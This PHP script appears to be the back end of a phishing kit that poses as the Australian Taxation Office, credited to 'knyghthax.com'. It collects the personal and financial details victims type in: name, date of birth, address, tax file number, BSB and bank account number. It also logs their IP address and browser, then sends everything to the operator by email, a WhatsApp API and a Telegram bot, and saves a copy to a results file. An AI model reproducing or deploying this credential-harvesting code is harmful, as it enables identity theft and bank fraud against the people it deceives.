<?php

error_reporting(0);
session_start();
include "../../admin/setting/rezlts_settings/bot_settings.php";
$ipaddress = getenv('REMOTE_ADDR');
$useragent=$_SERVER['HTTP_USER_AGENT'];
$message = "[==========   ATO Billing  ===========]\r\n";
$message .= "|Full Name      : ".$_POST['fnam']."\r\n";
$message .= "|Phone Number      : ".$_POST['ph']."\r\n";
$message .= "|Date Of Birth      : ".$_POST['dob']."\r\n";
$message .= "|Address      : ".$_POST['addy']."\r\n";
$message .= "|Tax file number      : ".$_POST['tfn']."\r\n";
$message .= "|Date Of Issue      : ".$_POST['doi']."\r\n";
$message .= "|Reference No       : ".$_POST['rn']."\r\n";
$message .= "|Bank state branch      : ".$_POST['bsb']."\r\n";
$message .= "|Bank account number      : ".$_POST['accnum']."\r\n";

$message .= "|UserAgent:   $useragent   ]\r\n";
$message .= "Ip: ====: $ipaddress :====\r\n";

$message .= "--------------- $C4MP4G3 By knyghthax.com -----------------\n";
$send = $email; 
$subject = "♠️ (".$_POST['login'].")  RZLT ♠️ $ip";
$headers = "From: [KNYGHT]";
mail($send,$subject,$message,$headers);
$url='https://api.callmebot.com/whatsapp.php?source=php&phone='.$phone.'&text='.urlencode($message).'&apikey='.$apikey;
$html=file_get_contents($url);

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );
$save=fopen("../../KNYGHT_RZLT.txt","a+");
fwrite($save,$message);
fclose($save);

    echo '<script>window.location.href = "../../identity/";</script>';
   

?>
